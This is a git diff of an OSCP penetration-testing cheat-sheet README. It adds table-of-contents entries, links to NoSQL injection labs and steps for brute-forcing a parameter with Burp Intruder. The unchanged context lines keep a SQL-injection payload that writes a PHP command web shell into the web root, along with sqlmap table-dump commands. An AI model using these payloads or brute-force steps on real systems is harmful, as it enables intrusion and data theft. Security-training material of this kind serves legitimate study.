@@ -6,6 +6,8 @@ This repository describes cheat sheet and knowledge for OSCP.
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
+- [oscp-cheatsheet](#oscp-cheatsheet)
+- [Contents](#contents)
 - [Enumeration](#enumeration)
   - [Network](#network)
     - [nmap](#nmap)
@@ -58,7 +60,7 @@ This repository describes cheat sheet and knowledge for OSCP.
         - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
 - [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
     - [Debugger](#debugger)
-    - [jwt_tool](#jwt_tool)
+    - [jwt\_tool](#jwt_tool)
       - [tampering](#tampering)
       - [exploit](#exploit)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
@@ -73,7 +75,7 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Get privilege type from user](#get-privilege-type-from-user)
     - [Get access database](#get-access-database)
     - [Get schema names](#get-schema-names)
-    - [Get table name from information_schema](#get-table-name-from-information_schema)
+    - [Get table name from information\_schema](#get-table-name-from-information_schema)
     - [Get column name from table name](#get-column-name-from-table-name)
     - [Write shell](#write-shell)
   - [sqlmap](#sqlmap)
@@ -81,6 +83,9 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [second request](#second-request)
     - [enumerate tables](#enumerate-tables)
     - [extract data from table](#extract-data-from-table)
+- [NoSQL Injection](#nosql-injection)
+  - [Labs for detecting Syntax injection in MongoDB](#labs-for-detecting-syntax-injection-in-mongodb)
+  - [Labs for detecting operator injection](#labs-for-detecting-operator-injection)
 - [XSS](#xss)
   - [Polyglot](#polyglot)
 - [Aggregating Sensitive Information](#aggregating-sensitive-information)
@@ -191,6 +196,7 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [applying the configuration and image](#applying-the-configuration-and-image)
 - [BurpSuite](#burpsuite)
   - [Hot Keys](#hot-keys)
+  - [Brute force attack by intruder](#brute-force-attack-by-intruder)
 - [GraphQL](#graphql)
 - [Others](#others)
   - [References for OSCP](#references-for-oscp)
@@ -531,9 +537,6 @@ select column_name from information_schema.columns where table_name = <table_nam
 select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/0xdf.php'
 ```
 
-
-
-
 ## sqlmap
 ### Basic Example
 ```shell
@@ -572,6 +575,15 @@ sqlmap -r req.txt --second-req=secreq.txt --threads 5 --tamper=space2comment --t
 sqlmap -r req.txt --second-req=secreq.txt --threads 5 --tamper=space2comment -T users --dump
 ```
 `-T`: table name
+
+# NoSQL Injection
+https://portswigger.net/web-security/nosql-injection
+
+## Labs for detecting Syntax injection in MongoDB
+https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection
+
+## Labs for detecting operator injection 
+https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
 
 # XSS
 ## Polyglot
@@ -1287,6 +1299,16 @@ kubectl --token=$token --certificate-authority=ca.crt -server=https://$IP:8443 a
 # BurpSuite
 ## Hot Keys
 https://github.com/rinetd/BurpSuite-1/blob/master/CheatSheet.md
+
+## Brute force attack by intruder
+1. Right click on the request 
+2. "Send to Intruder"
+3. select the value you want to change by brute force
+4. "Add $"
+5. Focus on the "Payload" and configure the brute force payloads, such as "Numbers" and "Simple list", etc...
+6. "Start Attack:
+
+![alt text](image.png)
 
 # GraphQL
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
